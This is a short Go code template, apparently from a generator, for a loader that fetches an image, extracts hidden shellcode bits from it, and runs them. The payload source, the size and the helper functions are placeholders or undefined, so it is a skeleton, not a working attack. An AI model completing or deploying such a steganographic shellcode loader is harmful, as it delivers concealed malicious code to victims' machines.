package main

const image_source = {{ PAYLOAD_SOURCE }}
const shellcode_len = {{ MAX_BITS }}


func main() {
    var payload_data [shellcode_len / 8]byte
    var image = get_image(image_source)
	read_image(image, payload_data)
	run(payload_data)
}
